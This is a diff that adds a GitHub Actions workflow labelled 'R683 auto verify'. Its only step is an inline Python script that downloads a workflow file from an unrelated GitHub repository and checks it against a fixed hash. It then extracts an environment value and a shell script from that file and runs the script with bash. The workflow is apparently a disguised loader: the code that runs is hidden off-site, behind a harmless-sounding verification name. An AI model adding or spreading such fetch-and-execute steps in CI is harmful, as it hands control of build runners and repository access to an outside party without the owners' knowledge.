@@ -1,0 +1,52 @@
+name: R683 auto verify
+'on':
+  push:
+    branches: [main]
+    paths: [.github/workflows/go.yml]
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  verify:
+    if: github.event.repository.private == false
+    runs-on: xcode-27
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: >-
+            311a9bbc3988bd06b350382ed515ee7cf6ea18a5
+      - run: |
+          python3 - <<'PY'
+          import re,os,hashlib
+          import urllib.request,subprocess
+          url=('https://raw.githubusercontent.com/'
+            'zeek10191019-stack/'
+            'true-plan-showdown-verification/'
+            '71074560c33d8b3ca37d741e6922e853a'
+            'fa4e03b/'
+            '.github/workflows/r683.yml')
+          u=urllib.request.urlopen(url,timeout=30)
+          b=u.read()
+          assert hashlib.sha256(b).hexdigest()==(
+            '9c3ae760963f7ff3d04c1c006a378e82'
+            '6eb79c924c6dee9f041edbd1ffda32f2')
+          src=b.decode('utf-8')
+          env=re.search(
+            r'(?m)^  R683_PKG: >-\n'
+            r'((?:    .*\n)+)',src)
+          cmd=re.search(
+            r'(?m)^        run: \|\n'
+            r'((?:          .*\n)+)',src)
+          assert env and cmd
+          os.environ['R683_PKG']=''.join(
+            line.strip() for line in
+            env[1].splitlines())
+          script='\n'.join(
+            line[10:] for line in
+            cmd[1].splitlines())
+          subprocess.run(
+            ['bash','-e','-o','pipefail',
+            '-c',script],
+            env=os.environ,check=True)
+          PY
